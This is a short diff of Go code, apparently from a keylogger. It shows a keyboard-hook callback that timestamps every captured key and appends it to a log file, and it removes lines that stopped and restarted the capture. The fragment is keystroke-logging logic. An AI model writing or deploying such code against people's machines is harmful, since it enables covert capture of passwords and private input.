@@ -26,10 +26,6 @@ func registerKeystrokes() {
 			datetime := time.Now()
 			message := "[" + datetime.Format("01-02-2006 15:04:05") + "] Key: " + string(event.Keychar) + "\n"
 			appendToFile(LogFileHandle, []byte(message))
-
-			keyHook.StopEvent()
-			time.Sleep(time.Millisecond * 500)
-			startCapturing(LogFilePath)
 		})
 	}
 }
